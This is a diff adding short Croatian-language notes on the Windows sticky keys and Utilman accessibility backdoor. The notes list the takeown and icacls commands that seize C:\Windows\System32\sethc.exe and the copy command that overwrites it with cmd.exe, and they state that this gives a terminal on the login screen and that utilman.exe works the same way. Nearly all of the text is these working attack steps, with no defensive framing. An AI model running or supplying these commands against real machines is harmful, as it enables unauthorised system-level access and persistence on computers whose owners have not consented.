@@ -1,0 +1,17 @@
+Sticky keys
+Pri pritiskanju kombinacije tipki poput ctrl + alt + del ili brzo shift, windows ce nam dati popup da nas pita zelimo li ukljuciti sticky keys.
+Ono sto se pokrene kada kliknemo te tipke je executable:
+
+C:\Windows\System32\sethc.exe
+
+Kako bi modificirali, tj zamjenili tu datoteku moramo prvo dobiti ovlasti za nju preko naredbi:
+
+takeown /f C:\windows\system32\sethc.exe
+icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+copy c:\Windows\System32\cmd.exe C:\Windows\system32\sethc.exe
+
+Sada imamo terminal na login screenu.
+
+Utilman
+
+Ista stvar kao i za sticky keys, samo datoteka koju mjenjamo se nalazi na lokaciji C:\windows\system32\utilman.exe
